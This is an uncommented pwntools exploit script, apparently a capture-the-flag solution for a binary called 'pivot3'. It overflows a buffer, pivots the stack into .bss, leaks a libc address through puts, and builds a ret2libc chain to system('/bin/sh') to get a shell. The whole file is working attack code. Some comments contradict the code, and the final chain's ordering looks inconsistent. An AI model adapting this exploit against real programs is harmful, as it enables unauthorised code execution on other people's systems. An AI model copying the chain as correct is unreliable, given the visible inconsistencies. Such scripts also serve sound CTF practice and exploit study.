from pwn import *

p = process("./pivot3")
e = ELF("./pivot3")
libc = e.libc

read_plt = e.plt['read']
read_got = e.got['read']
put_got = e.got['puts']
puts_plt = e.plt['puts']
pop_rdi = 0x00400783
pop_rsi_r15 = 0x00400781
leave_ret = 0x0040071e
ret = 0x0040053e

bss = e.bss() + 0x300

#rbp = bss

payload = b"A"*0x30
payload += p64(bss)

# read(0, bss, 0x100)

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(bss)
payload += p64(0)
payload += p64(read_plt)
payload += p64(leave_ret)

p.send(payload)

# ret = leave ret
payload = p64(bss + 0x400)
# rbp = bss + 100
payload += p64(pop_rdi)
payload += p64(put_got)
payload += p64(puts_plt)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(bss + 0x400)
payload += p64(0)
payload += p64(read_plt)
payload += p64(leave_ret)
# ret = read(0, bss+ 100, 100)

p.send(payload)
put_addr =u64(p.recv(6).ljust(8, b'\x00'))

log.info("read add :" + hex(put_addr))
libc_base = put_addr - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b"/bin/sh"))
# puts(puts)
payload = b'A'*8

payload += p64(pop_rdi)
payload += p64(ret)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)

pause()
p.send(payload)
# libc =
p.interactive()
